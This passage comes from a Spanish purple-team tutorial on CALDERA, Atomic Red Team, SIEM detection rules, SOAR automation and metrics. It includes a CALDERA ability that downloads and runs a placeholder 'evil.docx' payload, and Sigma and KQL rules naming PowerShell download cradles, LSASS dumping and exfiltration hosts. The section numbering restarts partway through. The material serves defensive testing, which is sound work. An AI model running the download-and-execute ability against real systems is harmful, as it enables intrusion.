      - action: disable_account; integration: active_directory
      - action: create_ticket; integration: servicenow
  - id: notification
    type: parallel
    actions:
      - action: send_slack; message: "PowerShell detected: {user} - {host}"
      - action: send_email; to: soc@company.com
```

### 8.3 Integración con herramientas

```python
class SOARPlaybookExecutor:
    def __init__(self, soar_url, api_key):
        self.url = soar_url.rstrip("/")
        self.headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}

    def create_ticket(self, title, description, severity="medium", assignee="soc"):
        payload = {"title": title, "description": description, "severity": severity, "assignee": assignee}
        resp = requests.post(f"{self.url}/api/v1/tickets", headers=self.headers, json=payload)
        return resp.json()

    def trigger_playbook(self, playbook_id, context):
        payload = {"playbook_id": playbook_id, "context": context, "trigger_type": "automated"}
        resp = requests.post(f"{self.url}/api/v1/playbooks/{playbook_id}/trigger", headers=self.headers, json=payload)
        return resp.json()

    def enrich_ioc(self, ioc_type, ioc_value):
        payload = {"type": ioc_type, "value": ioc_value}
        resp = requests.post(f"{self.url}/api/v1/enrichment", headers=self.headers, json=payload)
        return resp.json()

    def auto_respond(self, alert):
        enriched = self.enrich_ioc("hash", alert.get("file_hash", ""))
        ticket = self.create_ticket(f"Auto-response: {alert['technique']}", json.dumps(alert, indent=2))
        if enriched.get("malicious", False):
            self.block_indicator("hash", alert["file_hash"], 86400)
        playbook = self.trigger_playbook("powershell_response", alert)
        return {"ticket": ticket, "playbook": playbook, "blocked": enriched.get("malicious", False)}
```

## 9. Métricas y KPIs

### 9.1 Detection Time (MTTD)

Mean Time To Detect: tiempo promedio entre que ocurre un ataque y es detectado.

```python
class MTTDCalculator:
    def calculate(self, detections):
        if not detections:
            return {"mttd": 0, "min": 0, "max": 0}
        times = [(d["detect_time"] - d["start_time"]).total_seconds() for d in detections]
        return {"mttd": sum(times) / len(times), "min": min(times), "max": max(times)}
```

### 9.2 Response Time (MTTR)

Mean Time To Respond: tiempo entre detección y contención.

```python
class MTTRCalculator:
    def calculate(self, responses):
        times = [(r["end_time"] - r["detect_time"]).total_seconds() for r in responses]
        return {"mttr": sum(times) / len(times) if times else 0}
```

### 9.3 Coverage Percentage

```python
class CoverageMetrics:
    def __init__(self):
        self.total_techniques = 280
        self.covered = 0
        self.coverage_by_tactic = {}

    def update(self, technique_id, has_detection, tactic):
        if tactic not in self.coverage_by_tactic:
            self.coverage_by_tactic[tactic] = {"total": 0, "covered": 0}
        self.coverage_by_tactic[tactic]["total"] += 1
        if has_detection:
            self.coverage_by_tactic[tactic]["covered"] += 1
            self.covered += 1

    def report(self):
        overall = self.covered / self.total_techniques * 100 if self.total_techniques else 0
        return {"overall_coverage": round(overall, 1), "total": self.total_techniques,
                "covered": self.covered, "gaps": self.total_techniques - self.covered,
                "by_tactic": {t: round(d["covered"]/d["total"]*100, 1)
                             for t, d in self.coverage_by_tactic.items()}}
```

### 9.4 Otras métricas esenciales

| Métrica | Descripción | Target |
|---------|-------------|--------|
| Detection Rate | % de técnicas detectadas | >80% |
| False Positive Rate | % de alertas falsas | <5% |
| Alert Volume | Alertas por día | <1000/día |
| Coverage by Tactic | % por cada táctica | >70% c/u |
| Time to Triage | Tiempo hasta revisión | <15 min |
| Mean Time to Contain | Tiempo hasta contener | <1 hora |
| Mean Time to Resolve | Tiempo hasta resolver | <24 horas |

## 10. Laboratorio Final

**Objetivo:** Ejecutar un ciclo [purple team](../raw/p9rpl3-t34m.md) completo usando CALDERA, Atomic [red team](../raw/r3d-t34m-1nfr4.md), y SIEM.

**Escenario:**
Simular el ciclo completo: planificación, ejecución, medición y mejora de detecciones para técnicas de [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck).

**Fases:**

**Fase 1: Setup (1 hora)**
1. Instalar CALDERA con plugins: stockpile, sandcat, atomic
2. Instalar Atomic [red team](../raw/r3d-t34m-1nfr4.md) ([powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) module)
3. Configurar entorno Windows con [sysmon](../raw/3dr-3v4s10n.md#sysmon) y PowerShell logging
4. Configurar Splunk/Sentinel para ingesta de logs

```bash
# Instalar Sysmon
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "Sysmon.zip"
Expand-Archive -Path "Sysmon.zip" -DestinationPath "Sysmon"
.\Sysmon\Sysmon64.exe -accepteula -i sysmon-config.xml

# Habilitar PowerShell ScriptBlock Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
```

**Fase 2: Planificación (30 min)**
1. Seleccionar 5 técnicas para probar: T1059.001, T1003.001, T1547.001, T1566.001, T1078
2. Definir procedimientos específicos para cada técnica
3. Verificar que los sensores están activos

**Fase 3: Ejecución (2 horas)**
1. Para cada técnica:
   a. [red](../raw/r3d3s-f0nd4m3nt0s.md) Team ejecuta la técnica (Atomic o CALDERA)
   b. Blue Team monitorea en tiempo real
   c. Registrar si se detectó, tiempo de detección, alertas generadas

**Fase 4: Medición (1 hora)**
1. Calcular detection rate por técnica y táctica
2. Identificar gaps de detección
3. Priorizar gaps por riesgo

**Fase 5: Mejora (1.5 horas)**
1. Crear reglas [sigma](../raw/thr3t-hnt.md#sigma) para técnicas no detectadas
2. Implementar consultas KQL/SPL
3. Configurar alertas en el SIEM
4. Actualizar playbooks de respuesta

**Fase 6: Reporte (30 min)**
```markdown
# Purple Team Exercise Report

## Resumen
- Técnicas probadas: 5
- Detection rate: X%
- TTD promedio: X minutos
- Gaps identificados: X

## Detalle por Técnica
| Técnica | Detectado? | TTD | Regla Existente |
|---------|-----------|-----|-----------------|
| T1059.001 | ✓ | 30s | PS_ScriptBlock_Rule |
| T1003.001 | ✗ | N/A | - (gap!) |
| T1547.001 | ✓ | 45s | Reg_Run_Key_Rule |

## Recomendaciones
1. Crear regla para T1003.001 (LSASS dumping)
2. Mejorar regla de T1547.001 para reducir FPs
3. Programar próximo ejercicio en 2 semanas
```

> **Disclaimer:** Este tutorial es exclusivamente con fines educativos. Todas las técnicas y herramientas descritas deben ser utilizadas únicamente en entornos autorizados. El acceso no autorizado a sistemas puede constituir un delito. El autor no se hace responsable por el mal uso de esta información.

## 3. CALDERA: Desarrollo de Abilities Personalizadas

### 3.9 Ability personalizada paso a paso

Crear una ability custom desde cero:

```yaml
id: custom-phishing-001
name: Spearphishing Attachment Download
description: Simula descarga de adjunto malicioso
tactic: initial-access
technique_id: T1566.001
technique_name: Spearphishing Attachment
platforms:
  windows:
    ps1:
      command: |
        $url = "http://#{server}/#{payload}"
        $output = "$env:TEMP\#{payload}"
        Invoke-WebRequest -Uri $url -OutFile $output
        Start-Process $output
      cleanup: |
        Remove-Item "$env:TEMP\#{payload}" -Force
privilege: USER
executor: ps1
```

**Registro via API:**
```python
ability_data = {
    "ability_id": "custom-phishing-001",
    "name": "Spearphishing Attachment Download",
    "tactic": "initial-access",
    "technique_id": "T1566.001",
    "executors": [{
        "platform": "windows", "name": "ps1",
        "command": 'Invoke-WebRequest -Uri http://#{server}/evil.docx -OutFile $env:TEMP\\evil.docx; Start-Process $env:TEMP\\evil.docx'
    }]
}
headers = {"KEY": "ADMIN123", "Content-Type": "application/json"}
requests.post("http://localhost:8888/api/v2/abilities", headers=headers, json=ability_data)
```

### 3.10 Autonomous Operation Mode

CALDERA puede decidir el próximo paso según resultados anteriores.

```python
class AutonomousOperation:
    def __init__(self, api):
        self.api = api

    def run_autonomous(self, initial_adversary_id, target_group="red"):
        current_adversary = initial_adversary_id
        iteration = 0
        while iteration < 10:
            result = self.api.run_operation_blocking(
                name=f"Auto_Op_{iteration}", adversary_id=current_adversary, group=target_group
            )
            failed = [a for a in result.get("abilities", []) if not a.get("detected")]
            if failed:
                abilities = self.api.list_abilities()
                matching = [a["id"] for a in abilities if a.get("technique_id") in [f.get("technique_id") for f in failed]]
                if matching:
                    adv = self.api.create_adversary(f"Focused_{iteration}", matching)
                    current_adversary = adv["id"]
                    iteration += 1
                    continue
            break
        return result
```

## 4. Atomic [red team](../raw/r3d-t34m-1nfr4.md): Automatización Avanzada

### 4.7 Integración con CALDERA

```bash
# Los tests de Atomic aparecen como abilities en CALDERA con el plugin atomic
cp -r atomic-red-team/atomics/* caldera/plugins/atomic/atomics/
```

### 4.8 Ejecución programada

```bash
#!/bin/bash
TECHNIQUES=("T1059.001" "T1003.001" "T1547.001")
for tech in "${TECHNIQUES[@]}"; do
    pwsh -Command "Import-Module AtomicRedTeam; Invoke-AtomicTest $tech -Passthru | Out-File results_${tech}.json"
done
```

### 4.9 Validación de reglas SIEM

```powershell
function Test-SIEMDetection {
    param([string]$TechniqueId, [int]$TimeoutSeconds = 300)
    $startTime = Get-Date
    Invoke-AtomicTest $TechniqueId -TestNumbers 1 -TimeoutSeconds 30
    $elapsed = 0
    while ($elapsed -lt $TimeoutSeconds) {
        $result = Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';ID=4104} -MaxEvents 1
        if ($result) {
            $ttd = ((Get-Date) - $startTime).TotalSeconds
            return @{Detected=$true; TTD=$ttd}
        }
        Start-Sleep -Seconds 5; $elapsed += 5
    }
    return @{Detected=$false}
}
```

## 5. Defense Evaluation: Telemetría y Medición

### 5.5 Checklist de telemetría esencial

```
[Windows]
[ ] PowerShell ScriptBlock Logging (EventID 4104)
[ ] Process Creation con CommandLine (EventID 4688)
[ ] Sysmon instalado y configurado
[ ] Windows Security Event Log

[Linux]
[ ] auditd instalado
[ ] auth.log monitoreado

[Network]
[ ] Netflow/IPFIX habilitado
[ ] DNS logs, Proxy logs, Firewall logs

[Cloud]
[ ] CloudTrail (AWS), Activity Log (Azure), Audit Logs (GCP)
```

### 5.6 Scorecard de Madurez

```python
class MaturityScorecard:
    DIMENSIONS = {
        "cobertura": 25, "velocidad": 20, "calidad": 20,
        "automatizacion": 15, "colaboracion": 10, "mejora": 10
    }

    def __init__(self):
        self.scores = {}

    def set_metric(self, dim, metric, value):
        if dim not in self.scores: self.scores[dim] = {}
        self.scores[dim][metric] = value

    def calculate(self):
        total = 0
        for dim, weight in self.DIMENSIONS.items():
            vals = self.scores.get(dim, {}).values()
            avg = sum(vals) / len(vals) if vals else 0
            total += avg * weight / 100
        level = "Optimizado" if total >= 90 else "Integrado" if total >= 75 else "Colaborativo" if total >= 55 else "Informativo" if total >= 35 else "Aislado"
        return {"score": round(total * 100, 1), "level": level}
```

## 6. [purple team](../raw/p9rpl3-t34m.md) Exercises: Multi-entorno

### 6.5 Ejecución en múltiples entornos

```python
class MultiEnvironmentTest:
    def run_across(self, apis, technique_id):
        results = {}
        for env_name, api in apis.items():
            abilities = [a for a in api.list_abilities() if a.get("technique_id") == technique_id]
            if abilities:
                adv = api.create_adversary(f"Test_{technique_id}_{env_name}", [abilities[0]["id"]])
                report = api.run_operation_blocking(f"Purple_{technique_id}_{env_name}", adv["id"])
                results[env_name] = {"detected": report.get("detected"), "ttd": report.get("ttd")}
        return results
```

### 6.6 Tracking de mejora entre ejercicios

```python
class ImprovementTracker:
    def __init__(self):
        self.exercises = []

    def add_exercise(self, date, results):
        total = len(results)
        detected = sum(1 for r in results if r["detected"])
        self.exercises.append({
            "date": date, "total": total, "detected": detected,
            "rate": round(detected/total*100, 1) if total else 0,
            "avg_ttd": round(sum(r["ttd"] for r in results if r["detected"])/max(detected,1), 1)
        })

    def trend(self):
        if len(self.exercises) < 2: return {"message": "Need 2+ exercises"}
        first, last = self.exercises[0], self.exercises[-1]
        return {
            "rate_change": round(last["rate"] - first["rate"], 1),
            "ttd_change": round(first["avg_ttd"] - last["avg_ttd"], 1),
            "trend": "improving" if last["rate"] > first["rate"] else "declining"
        }
```

## 7. SIEM Tuning: Reglas desde Gaps

### 7.6 Creación automática de reglas

```python
class AutoRuleCreator:
    def create_from_gap(self, technique_id, risk="medium"):
        templates = {
            "T1059.001": f"""
index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational
EventCode=4104 ScriptBlockText IN ("*-enc*", "*DownloadString*", "*IEX *")
| eval risk="{risk}"
| table _time, host, AccountName, ScriptBlockText
""",
            "T1003.001": f"""
index=windows sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=10 TargetImage="*\\\\lsass.exe"
| stats count by host, AccountName
| where count > 1
"""
        }
        return templates.get(technique_id, f"# Generic rule for {technique_id}")
```

### 7.7 Dashboard de efectividad

```python
class RuleDashboard:
    def __init__(self):
        self.rules = {}

    def register(self, rule_id, technique, name):
        self.rules[rule_id] = {"technique": technique, "name": name, "tp": 0, "fp": 0}

    def record(self, rule_id, is_tp):
        self.rules[rule_id]["tp" if is_tp else "fp"] += 1

    def report(self):
        lines = ["| Rule | Technique | TP | FP | Precision |"]
        lines.append("|------|-----------|----|----|-----------|")
        for rid, info in self.rules.items():
            tp, fp = info["tp"], info["fp"]
            precision = round(tp/(tp+fp)*100, 1) if (tp+fp) > 0 else 0
            lines.append(f"| {info['name']} | {info['technique']} | {tp} | {fp} | {precision}% |")
        return "\\n".join(lines)
```

## 8. SOAR: Respuesta Automatizada

### 8.4 [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) para [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) malicioso

```python
class PowerShellResponder:
    def respond(self, alert):
        host = alert.get("host", "unknown")
        user = alert.get("user", "unknown")
        cmd = alert.get("command_line", "")
        severity = "critical" if "IEX" in cmd and "http" in cmd else "high" if "-enc" in cmd else "medium"

        actions = []
        if severity == "critical":
            actions.append(f"isolate_endpoint({host})")
            actions.append(f"disable_user({user})")
        elif severity == "high":
            actions.append(f"kill_process({host})")
            actions.append(f"disable_user({user})")

        return {"severity": severity, "actions": actions, "status": "contained" if severity == "critical" else "investigating"}
```

## 9. Reportes Ejecutivos Automáticos

### 9.5 Generador de reportes para management

```python
class ExecutiveReport:
    def __init__(self, company, quarter):
        self.company = company
        self.quarter = quarter
        self.metrics = {}

    def add(self, name, value, target):
        self.metrics[name] = {"value": value, "target": target,
                              "status": "on_track" if value >= target else "needs_attention"}

    def generate(self):
        report = f"# Purple Team Report: {self.company} - {self.quarter}\\n\\n"
        for name, data in self.metrics.items():
            icon = "✅" if data["status"] == "on_track" else "⚠️"
            report += f"{icon} **{name}**: {data['value']} (Target: {data['target']})\\n"
        return report


# Ejemplo
gen = ExecutiveReport("Empresa SA", "2024-Q3")
gen.add("Detection Rate", 72, 80)
gen.add("MTTD (min)", 8.5, 5)
gen.add("Coverage by Tactic", 65, 70)
print(gen.generate())
```

## 10. Ciclo [purple team](../raw/p9rpl3-t34m.md) Completo

```python
class FullPurpleCycle:
    def run(self, techniques):
        print("CICLO PURPLE TEAM\\n")
        # Fase 1: Planificacion
        print(f"[1] Planificacion: {len(techniques)} tecnicas")
        # Fase 2: Ejecucion
        print("[2] Ejecutando tests...")
        results = []
        for tech in techniques:
            detected = True  # simulacion
            ttd = 30  # simulacion
            results.append({"technique": tech, "detected": detected, "ttd": ttd})
        # Fase 3: Medicion
        rate = sum(1 for r in results if r["detected"]) / len(results) * 100
        print(f"[3] Detection rate: {rate:.0f}%")
        # Fase 4: Mejora
        print("[4] Creando reglas para gaps...")
        # Fase 5: Reporte
        print("[5] Reporte generado")
        return results

FullPurpleCycle().run(["T1059.001", "T1003.001", "T1547.001", "T1566.001"])
```

---

> **Disclaimer:** Este tutorial es exclusivamente con fines educativos. Todas las técnicas y herramientas descritas deben ser utilizadas únicamente en entornos autorizados como parte de programas de pruebas de seguridad legítimos. El acceso no autorizado a sistemas puede constituir un delito en la mayoría de las jurisdicciones. El autor no se hace responsable por el mal uso de esta información.


## Apéndice A: Referencia Rápida de Comandos

### A.1 Comandos CALDERA

```bash
# Verificar estado del servidor
curl http://localhost:8888

# Listar agentes via API
curl -H "KEY: ADMIN123" http://localhost:8888/api/v2/agents | jq

# Listar abilities
curl -H "KEY: ADMIN123" http://localhost:8888/api/v2/abilities | jq '.abilities[] | {name, technique_id}'

# Crear adversary
curl -X POST -H "KEY: ADMIN123" -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/adversaries \
  -d '{"name":"Test","atomic_ordering":["ability-id-1","ability-id-2"]}'

# Iniciar operación
curl -X POST -H "KEY: ADMIN123" -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/operations \
  -d '{"name":"Op1","adversary_id":"adv-id","group":"red","autonomous":1,"state":"running"}'

# Obtener reporte
curl -H "KEY: ADMIN123" http://localhost:8888/api/v2/reports/operation-id | jq

# Obtener cobertura
curl -H "KEY: ADMIN123" "http://localhost:8888/api/v2/coverage?operation=operation-id" | jq
```

### A.2 Comandos Atomic [red team](../raw/r3d-t34m-1nfr4.md)

```powershell
# Listar todas las técnicas disponibles
Get-AtomicTechnique -ShowDetails

# Listar tests de una técnica
Get-AtomicTechnique T1059.001 -ShowDetails

# Ejecutar test específico
Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3

# Ejecutar con argumentos personalizados
Invoke-AtomicTest T1003.001 -InputArgs @{url='http://test'}

# Simular sin ejecutar
Invoke-AtomicTest T1059.001 -Simulate

# Ejecutar y guardar resultados
Invoke-AtomicTest T1059.001 -Passthru | ConvertTo-Json | Out-File results.json

# Limpiar después del test
Invoke-AtomicTest T1059.001 -Cleanup

# Ejecutar todos los tests de una táctica
Invoke-AtomicTest -Tactic execution

# Ejecutar en modo silencioso
Invoke-AtomicTest T1059.001 -Quiet
```

### A.3 Consultas SIEM por técnica

```kql
// T1059.001 - PowerShell Execution
DeviceProcessEvents | where FileName has "powershell"
| where ProcessCommandLine has_any ("-enc", "DownloadString", "IEX ")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// T1003.001 - LSASS Credential Dumping
DeviceEvents | where ActionType == "LsassAccess"
| project Timestamp, DeviceName, InitiatingProcessFileName

// T1547.001 - Registry Run Key Persistence
DeviceRegistryEvents | where RegistryKey has @"CurrentVersion\Run"
| project Timestamp, DeviceName, RegistryKey, RegistryValueName

// T1566.001 - Spearphishing Attachment
EmailEvents | where AttachmentCount > 0
| where SenderFromDomain !endswith CompanyDomain
| project Timestamp, Subject, SenderFromAddress, AttachmentCount

// T1078 - Valid Accounts
SigninLogs | where ResultType == 0
| where UserPrincipalName has_any ("admin", "service", "backup")
| project Timestamp, UserPrincipalName, IPAddress, AppDisplayName

// T1021 - Lateral Movement
DeviceLogonEvents | where LogonType == 3
| where RemoteIP != "" and RemoteIP != "127.0.0.1"
| project Timestamp, DeviceName, AccountName, RemoteIP, RemotePort

// T1048 - Exfiltration
DeviceNetworkEvents | where RemoteUrl has_any ("pastebin", "transfer.sh", "attacker.com")
| project Timestamp, DeviceName, RemoteUrl, InitiatingProcessFileName
```

### A.4 Reglas [sigma](../raw/thr3t-hnt.md#sigma) rápidas

```yaml
title: Suspicious PowerShell Download
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - 'DownloadString'
      - 'WebClient'
      - 'Start-BitsTransfer'
  condition: selection
level: high

---
title: LSASS Suspicious Access
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 10
    TargetImage: '*\lsass.exe'
    GrantedAccess: '0x1FFFFF'
  condition: selection
level: critical

---
title: Registry Run Key Creation
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 13
    TargetObject|contains: '\CurrentVersion\Run'
  condition: selection
level: medium
```

### A.5 [pipeline](../raw/c1cd-h4ck1ng.md#pipeline) [ci/cd](../raw/c1cd-h4ck1ng.md) para [purple team](../raw/p9rpl3-t34m.md)

```yaml
# .github/workflows/purple-team.yml
name: Purple Team Automated Tests
on:
  schedule:
    - cron: '0 2 * * 1'  # Cada lunes a las 2 AM
  workflow_dispatch:

jobs:
  atomic-tests:
    runs-on: windows-latest
    strategy:
      matrix:
        technique: [T1059.001, T1003.001, T1547.001]
    steps:
      - uses: actions/checkout@v3
      - name: Install Atomic Red Team
        run: |
          Install-Module -Name AtomicRedTeam -Scope CurrentUser -Force
          Install-AtomicRedTeam -GetAtomics -Force
      - name: Run ${{ matrix.technique }}
        run: |
          $result = Invoke-AtomicTest ${{ matrix.technique }} -Passthru
          $result | ConvertTo-Json | Out-File "result_${{ matrix.technique }}.json"
      - name: Upload Results
        uses: actions/upload-artifact@v3
        with:
          name: results-${{ matrix.technique }}
          path: result_${{ matrix.technique }}.json

  generate-report:
    needs: atomic-tests
    runs-on: ubuntu-latest
    steps:
      - name: Download all results
        uses: actions/download-artifact@v3
      - name: Generate report
        run: |
          echo "# Purple Team Automated Report" > report.md
          echo "Date: $(date)" >> report.md
          for f in results-*/result_*.json; do
            echo "### $(basename $f)" >> report.md
            cat $f >> report.md
          done
      - name: Upload Report
        uses: actions/upload-artifact@v3
        with:
          name: purple-team-report
          path: report.md
```

## Apéndice B: Plantillas de Reportes

### B.1 Template de reporte ejecutivo

```markdown
# Purple Team Exercise Report

**Cliente:** [Nombre]
**Fecha:** [Fecha]
**Ejercicio:** [Número/Trimestre]

## Resumen Ejecutivo

Se ejecutaron [N] técnicas MITRE ATT&CK en el entorno de [producción/staging/test].

### Resultados Clave
- **Tasa de detección:** [X]%
- **TTD promedio:** [X] minutos
- **Gaps críticos:** [N]
- **Reglas creadas:** [N]

### Técnicas Probadas
| Técnica | Nombre | Detectada | TTD | Severidad |
|---------|--------|-----------|-----|-----------|
| T1059.001 | PowerShell | ✓/✗ | [T]s | Critical |
| T1003.001 | LSASS Dump | ✓/✗ | [T]s | Critical |

### Gaps de Detección
Las siguientes técnicas NO fueron detectadas:
1. **[Técnica]** - [Descripción del gap]
2. **[Técnica]** - [Descripción del gap]

### Recomendaciones
1. [Recomendación 1]
2. [Recomendación 2]
3. [Recomendación 3]

### Próximos Pasos
- Próximo ejercicio: [Fecha]
- Enfoque: [Áreas a cubrir]
```

### B.2 Template de gap analysis

```markdown
# Gap Analysis Report

## Metodología
Se evaluaron [N] técnicas del MITRE ATT&CK Enterprise Matrix
contra las capacidades de detección actuales.

## Cobertura por Táctica
| Táctica | Total | Cubierto | % | Estado |
|---------|-------|----------|---|--------|
| Initial Access | 10 | 6 | 60% | ⚠️ |
| Execution | 10 | 8 | 80% | ✅ |
| Persistence | 10 | 5 | 50% | ⚠️ |
| Privilege Escalation | 10 | 4 | 40% | ❌ |
| Defense Evasion | 12 | 6 | 50% | ⚠️ |
| Credential Access | 8 | 5 | 63% | ⚠️ |
| Discovery | 10 | 7 | 70% | ✅ |
| Lateral Movement | 8 | 4 | 50% | ⚠️ |
| Collection | 6 | 3 | 50% | ⚠️ |
| Command and Control | 8 | 5 | 63% | ⚠️ |
| Exfiltration | 6 | 2 | 33% | ❌ |
| Impact | 6 | 1 | 17% | ❌ |

## Gaps Priorizados

### Críticos (Alta prioridad)
1. **T1003.001 - OS Credential Dumping**: Sin detección actual. Permite robo de credenciales.
2. **T1059.001 - PowerShell**: Cobertura parcial. Mejorar reglas existentes.
3. **T1566.001 - Spearphishing Attachment**: Vector de entrada #1 sin cobertura.

### Altos
4. **T1021.002 - SMB Lateral Movement**: Movimiento lateral no detectado.
5. **T1048 - Exfiltration Over Alternative Protocol**: Exfiltración sin monitoreo.

## Recomendaciones Priorizadas
1. [ ] Implementar regla para T1003.001 (Sysmon EventID 10)
2. [ ] Mejorar regla para T1059.001 (ScriptBlock Logging)
3. [ ] Implementar detección de phishing (Email Gateway logs)
4. [ ] Configurar monitoreo de SMB (EventID 5140)
5. [ ] Implementar DLP para exfiltración
```

## Apéndice C: Glosario

| Término | Significado |
|---------|-------------|
| ATT&CK | Adversarial Tactics, Techniques, and Common Knowledge |
| TTP | Tactic, Technique, Procedure |
| MTTD | Mean Time to Detect |
| MTTR | Mean Time to Respond |
| FP | False Positive |
| TP | True Positive |
| FN | False Negative |
| SOC | Security Operations Center |
| SIEM | Security Information and Event Management |
| SOAR | Security Orchestration, Automation and Response |
| EDR | Endpoint Detection and Response |
| [sigma](../raw/thr3t-hnt.md#sigma) | Generic signature format for SIEM rules |
| KQL | Kusto Query Language ([azure](../raw/cl0ud-h4ck1ng.md#azure) Sentinel) |
| SPL | Search Processing Language (Splunk) |
| CALDERA | Automated adversary emulation system (MITRE) |
| Atomic | Individual test for a specific ATT&CK technique |
| Adversary | Profile that groups multiple abilities |
| Ability | Single TTP that CALDERA can execute |
| Fact | [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) used during CALDERA operations |
| Playbook | Automated response procedure |
| [purple team](../raw/p9rpl3-t34m.md) | Collaborative security testing methodology |
| [red team](../raw/r3d-t34m-1nfr4.md) | Offensive security team |
| Blue Team | Defensive security team |
| Gap Analysis | Identification of missing detection coverage |
| Coverage | Percentage of techniques with detection implemented |
| Heatmap | Visual representation of detection coverage |
| Detection Rate | Percentage of attacks detected |
| Precision | TP / (TP + FP) - accuracy of alerts |
| F1 Score | Harmonic mean of precision and recall |

## Apéndice D: Recursos de Aprendizaje

**Herramientas:**
- MITRE CALDERA: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://caldera.mitre.org/
- Atomic [red team](../raw/r3d-t34m-1nfr4.md): https://atomicredteam.io/
- [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck): https://attack.mitre.org/
- SigmaHQ: https://github.[com](../raw/w1n-s9bsyst3ms.md#com)/SigmaHQ/[sigma](../raw/thr3t-hnt.md#sigma)
- Splunk: https://www.splunk.com/
- [azure](../raw/cl0ud-h4ck1ng.md#azure) Sentinel: https://[azure](../raw/cl0ud-h4ck1ng.md#azure).microsoft.com/en-us/services/[azure](../raw/cl0ud-h4ck1ng.md#azure)-sentinel/

**Laboratorios:**
- Detection Lab (Chris Long): https://github.com/clong/DetectionLab
- [purple team](../raw/p9rpl3-t34m.md) Lab: https://github.com/splunk/purple-team-lab
- Caldera Lab: https://github.com/mitre/caldera
- Atomic [red team](../raw/r3d-t34m-1nfr4.md) Lab: https://github.com/redcanaryco/atomic-[red](../raw/r3d3s-f0nd4m3nt0s.md)-team

**Lectura recomendada:**
- "Purple Team Field Manual" - Tim Bryant
- "Blue Team Field Manual" - Alan White
- "Red Team Field Manual" - Ben Clark
- "The Hacker Playbook 3" - Peter Kim
- "Intelligence-Driven Incident Response" - Scott Roberts
- MITRE ATT&CK Design and Philosophy Whitepaper

**Cursos:**
- SANS SEC504: Hacker Techniques, Tools, and Incident Handling
- SANS SEC599: Defeating Advanced Adversaries
- Practical Purple Team: https://www.practicalpurpleteam.com/
- ATT&CK Training: https://attack.mitre.org/resources/training/

**Comunidad:**
- r/purpleteamsec - Reddit
- Purple Team Community - Discord
- MITRE ATT&CK Community - Slack
- Security B-Sides conferences
- DEF CON Blue Team Village

---

*Fin del tutorial 07 - Purple Teaming y Automatización*
*Creado por el equipo de [forense](../raw/w1n-f0r3ns1cs.md#forense)*

> **Disclaimer:** Este tutorial es exclusivamente con fines educativos y de capacitación en seguridad ofensiva. Todas las técnicas y herramientas descritas deben ser utilizadas únicamente en entornos autorizados y como parte de programas de pruebas de seguridad legítimos. El acceso no autorizado a sistemas, [redes](../raw/r3d3s-f0nd4m3nt0s.md) o datos puede constituir un delito en la mayoría de las jurisdicciones. El autor no se hace responsable por el mal uso de esta información.


## Apéndice E: Ejercicios Prácticos Adicionales

### E.1 Ejercicio: Configurar CALDERA desde cero

**Objetivo:** Instalar y configurar CALDERA, desplegar agentes, y ejecutar una operación básica.

**Duración estimada:** 2 horas

**Pasos:**
1. Instalar CALDERA en una VM Linux
2. Habilitar los plugins: stockpile, sandcat, atomic
3. Desplegar un agente Sandcat en un endpoint Windows
4. Crear un adversary con 3 abilities de execution
5. Ejecutar una operación en modo autónomo
6. Generar un reporte de cobertura

**Entregables:**
- Captura de pantalla del dashboard con agentes activos
- Archivo YAML del adversary creado
- Reporte de cobertura generado por CALDERA

**Solución guiada:**
```bash
# Paso 1: Instalar
git clone https://github.com/mitre/caldera.git
cd caldera
pip install -r requirements.txt

# Paso 2: Configurar plugins
cat > conf/local.yml << 'EOF'
host: 0.0.0.0
port: 8888
plugins:
  - access
  - atomic
  - compass
  - debrief
  - fieldmanual
  - sandcat
  - stockpile
  - training
api_key_blue: BLUE123
api_key_red: RED123
EOF

# Paso 3: Iniciar
python server.py --fresh &

# Paso 4: Desplegar agente (en el endpoint Windows)
# Navegar a http://kali:8888/plugins/sandcat
# Descargar el agente y ejecutarlo

# Paso 5: Verificar agente
curl -H "KEY: RED123" http://localhost:8888/api/v2/agents | jq

# Paso 6: Crear adversary (via API)
ADV_ID=$(curl -s -X POST -H "KEY: RED123" -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/adversaries \
  -d '{"name":"My First Adversary","atomic_ordering":["ability-id-1","ability-id-2","ability-id-3"]}' | jq -r '.id')

# Paso 7: Ejecutar operación
curl -X POST -H "KEY: RED123" -H "Content-Type: application/json" \
  http://localhost:8888/api/v2/operations \
  -d "{\"name\":\"My First Op\",\"adversary_id\":\"$ADV_ID\",\"group\":\"red\",\"autonomous\":1,\"state\":\"running\"}"
```

### E.2 Ejercicio: Gap Analysis manual

**Objetivo:** Realizar un gap analysis de cobertura de detección sin herramientas automatizadas.

**Duración estimada:** 3 horas

**Escenario:**
Eres el [purple team](../raw/p9rpl3-t34m.md) Lead de una empresa de e-commerce con:
- 5,000 endpoints Windows
- 200 servidores Linux
- Infraestructura [aws](../raw/cl0ud-h4ck1ng.md#aws)
- SIEM: Splunk
- EDR: CrowdStrike

**Tareas:**
1. Listar las 10 técnicas ATT&CK más relevantes para e-commerce
2. Para cada técnica, determinar si hay cobertura actual
3. Identificar gaps y priorizarlos por riesgo
4. Crear reglas [sigma](../raw/thr3t-hnt.md#sigma) para los gaps priorizados
5. Presentar un plan de remediación

**Técnicas sugeridas para evaluar:**
